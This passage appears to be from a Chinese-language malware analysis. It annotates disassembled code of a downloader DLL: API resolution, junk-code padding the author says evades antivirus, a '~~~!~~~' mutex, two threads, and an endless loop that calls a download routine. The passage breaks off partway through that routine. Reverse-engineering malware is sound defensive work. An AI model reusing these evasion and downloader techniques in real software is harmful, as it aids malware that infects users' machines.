
```asm
1000120F  |.  8B42 04       mov     eax, dword ptr [edx+4]
10001212  |.  FFD0          call    eax                                        ;  kernel32.GetProcAddress
10001214  |.  8BE5          mov     esp, ebp
10001216  |.  5D            pop     ebp
10001217  \.  C2 0400       retn    4
```

API地址填充完毕，看：

```asm
1000102A  |.  E8 91210000   call    100031C0
```

这个 `call` 启动两个线程：

```asm
100031C0  /$  55            push    ebp
100031C1  |.  8BEC          mov     ebp, esp
100031C3  |.  83EC 10       sub     esp, 10
100031C6  |.  894D F0       mov     dword ptr [ebp-10], ecx
100031C9  |.  50            push    eax
100031CA  |.  B8 01000000   mov     eax, 1
100031CF  |.  B8 04000000   mov     eax, 4
100031D4  |.  B8 0A000000   mov     eax, 0A
100031D9  |.  58            pop     eax
100031DA  |.  50            push    eax
100031DB  |.  B8 01000000   mov     eax, 1
100031E0  |.  B8 04000000   mov     eax, 4
100031E5  |.  B8 0A000000   mov     eax, 0A
100031EA  |.  58            pop     eax
100031EB  |.  50            push    eax
100031EC  |.  B8 01000000   mov     eax, 1
100031F1  |.  B8 04000000   mov     eax, 4
100031F6  |.  B8 0A000000   mov     eax, 0A
100031FB  |.  58            pop     eax
100031FC  |.  C645 F8 7E    mov     byte ptr [ebp-8], 7E
10003200  |.  C645 F9 7E    mov     byte ptr [ebp-7], 7E
10003204  |.  C645 FA 7E    mov     byte ptr [ebp-6], 7E
10003208  |.  C645 FB 21    mov     byte ptr [ebp-5], 21
1000320C  |.  C645 FC 7E    mov     byte ptr [ebp-4], 7E
10003210  |.  C645 FD 7E    mov     byte ptr [ebp-3], 7E
10003214  |.  C645 FE 7E    mov     byte ptr [ebp-2], 7E
10003218  |.  C645 FF 00    mov     byte ptr [ebp-1], 0
1000321C  |.  8D45 F8       lea     eax, dword ptr [ebp-8]
1000321F  |.  50            push    eax
10003220  |.  6A 00         push    0
10003222  |.  6A 00         push    0
10003224  |.  8B4D F0       mov     ecx, dword ptr [ebp-10]
10003227  |.  8B51 34       mov     edx, dword ptr [ecx+34]
1000322A  |.  FFD2          call    edx                                        ;  CreateMutex
1000322C  |.  6A 00         push    0
1000322E  |.  6A 00         push    0
10003230  |.  8B45 F0       mov     eax, dword ptr [ebp-10]
10003233  |.  50            push    eax
10003234  |.  68 80310010   push    <ThreadFunc1>                              ;  ThreadFunc1
10003239  |.  6A 00         push    0
1000323B  |.  6A 00         push    0
1000323D  |.  8B4D F0       mov     ecx, dword ptr [ebp-10]
10003240  |.  8B51 38       mov     edx, dword ptr [ecx+38]
10003243  |.  FFD2          call    edx                                        ;  CreateThread
10003245  |.  8945 F4       mov     dword ptr [ebp-C], eax
10003248  |.  8B45 F4       mov     eax, dword ptr [ebp-C]
1000324B  |.  50            push    eax
1000324C  |.  8B4D F0       mov     ecx, dword ptr [ebp-10]
1000324F  |.  8B91 84000000 mov     edx, dword ptr [ecx+84]
10003255  |.  FFD2          call    edx                                        ;  CloseHandle
10003257  |.  6A 00         push    0
10003259  |.  6A 00         push    0
1000325B  |.  8B45 F0       mov     eax, dword ptr [ebp-10]
1000325E  |.  50            push    eax
1000325F  |.  68 60310010   push    <ThreadFunc2>
10003264  |.  6A 00         push    0
10003266  |.  6A 00         push    0
10003268  |.  8B4D F0       mov     ecx, dword ptr [ebp-10]
1000326B  |.  8B51 38       mov     edx, dword ptr [ecx+38]
1000326E  |.  FFD2          call    edx                                        ;  CreateThread
10003270  |.  8945 F4       mov     dword ptr [ebp-C], eax
10003273  |.  6A FF         push    -1
10003275  |.  8B45 F4       mov     eax, dword ptr [ebp-C]
10003278  |.  50            push    eax
10003279  |.  8B4D F0       mov     ecx, dword ptr [ebp-10]
1000327C  |.  8B51 3C       mov     edx, dword ptr [ecx+3C]
1000327F  |.  FFD2          call    edx                                        ;  WaitForSingleObject
10003281  |.  33C0          xor     eax, eax
10003283  |.  8BE5          mov     esp, ebp
10003285  |.  5D            pop     ebp
10003286  \.  C3            retn
```

该 `call` 头部也是一堆垃圾代码，作为免杀的作用。然后创建一个 `"~~~!~~~"` 的互斥体。继而直接开两个线程 `10003180` 和 `10003160`。

其中 `10003180` 线程句柄直接 `CloseHandle` 了，`10003160` 线程句柄则被 `WaitForSingleObject` 了。这样是为了等所有动作执行完毕了才退出进程。

跟到 `ThreadFunc1`：

```asm
10003180 >/.  55            push    ebp
10003181  |.  8BEC          mov     ebp, esp
10003183  |.  51            push    ecx
10003184  |.  8B45 08       mov     eax, dword ptr [ebp+8]
10003187  |.  8945 FC       mov     dword ptr [ebp-4], eax
1000318A  |.  8B4D FC       mov     ecx, dword ptr [ebp-4]
1000318D  |.  E8 4EFFFFFF   call    <_Thread_func1>
10003192  |.  8BE5          mov     esp, ebp
10003194  |.  5D            pop     ebp
10003195  \.  C2 0400       retn    4
```

`<_Thread_func1>`：

```asm
100030E0 >/$  55            push    ebp
100030E1  |.  8BEC          mov     ebp, esp
100030E3  |.  81EC 30010000 sub     esp, 130
100030E9  |.  898D D0FEFFFF mov     dword ptr [ebp-130], ecx
100030EF  |.  8D8D D8FEFFFF lea     ecx, dword ptr [ebp-128]
100030F5  |.  E8 86FDFFFF   call    <Fill_Rubbish_Code>
100030FA  |>  B8 01000000   /mov     eax, 1
100030FF  |.  85C0          |test    eax, eax
10003101  |.  74 38         |je      short 1000313B                            ;  这里根本跳不出来， 死循环一个。
10003103  |.  50            |push    eax
10003104  |.  B8 01000000   |mov     eax, 1
10003109  |.  B8 04000000   |mov     eax, 4
1000310E  |.  B8 05000000   |mov     eax, 5
10003113  |.  B8 06000000   |mov     eax, 6
10003118  |.  B8 0A000000   |mov     eax, 0A
1000311D  |.  58            |pop     eax
1000311E  |.  8D8D D8FEFFFF |lea     ecx, dword ptr [ebp-128]
10003124  |.  E8 37FAFFFF   |call    10002B60
10003129  |.  68 A0BB0D00   |push    0DBBA0
1000312E  |.  8B8D D0FEFFFF |mov     ecx, dword ptr [ebp-130]
10003134  |.  8B51 40       |mov     edx, dword ptr [ecx+40]
10003137  |.  FFD2          |call    edx
10003139  |.^ EB BF         \jmp     short 100030FA
1000313B  |>  C785 D4FEFFFF>mov     dword ptr [ebp-12C], 0
10003145  |.  8D8D D8FEFFFF lea     ecx, dword ptr [ebp-128]
1000314B  |.  E8 F0F9FFFF   call    10002B40
10003150  |.  8B85 D4FEFFFF mov     eax, dword ptr [ebp-12C]
10003156  |.  8BE5          mov     esp, ebp
10003158  |.  5D            pop     ebp
10003159  \.  C3            retn
```

`Fill_Rubbish_Code` 这个 `call` 就是填充 N 多垃圾代码的。

`2B60` 这个 `call` 则开始着手下载工作了：

```asm
10002B60  /$  55            push    ebp
10002B61  |.  8BEC          mov     ebp, esp
10002B63  |.  81EC 40020000 sub     esp, 240
10002B69  |.  898D C0FDFFFF mov     dword ptr [ebp-240], ecx
10002B6F  |.  50            push    eax
10002B70  |.  B8 01000000   mov     eax, 1
10002B75  |.  B8 08000000   mov     eax, 8
10002B7A  |.  B8 09000000   mov     eax, 9
10002B7F  |.  B8 0A000000   mov     eax, 0A
10002B84  |.  58            pop     eax
10002B85  |.  50            push    eax
10002B86  |.  B8 01000000   mov     eax, 1
10002B8B  |.  B8 02000000   mov     eax, 2
10002B90  |.  B8 0A000000   mov     eax, 0A
10002B95  |.  58            pop     eax
10002B96  |.  68 04010000   push    104
10002B9B  |.  8D85 E8FEFFFF lea     eax, dword ptr [ebp-118]
10002BA1  |.  50            push    eax
10002BA2  |.  8B8D C0FDFFFF mov     ecx, dword ptr [ebp-240]
10002BA8  |.  8B51 30       mov     edx, dword ptr [ecx+30]
10002BAB  |.  FFD2          call    edx                                        ;  kernel32.GetSystemDirectoryA
10002BAD  |.  68 8A7F0000   push    7F8A
10002BB2  |.  68 007F0000   push    7F00
10002BB7  |.  6A 00         push    0
10002BB9  |.  8B85 C0FDFFFF mov     eax, dword ptr [ebp-240]
10002BBF  |.  8B88 F4000000 mov     ecx, dword ptr [eax+F4]
10002BC5  |.  FFD1          call    ecx
10002BC7  |.  50            push    eax
10002BC8  |.  8B95 C0FDFFFF mov     edx, dword ptr [ebp-240]
10002BCE  |.  8B82 F8000000 mov     eax, dword ptr [edx+F8]
10002BD4  |.  FFD0          call    eax
```
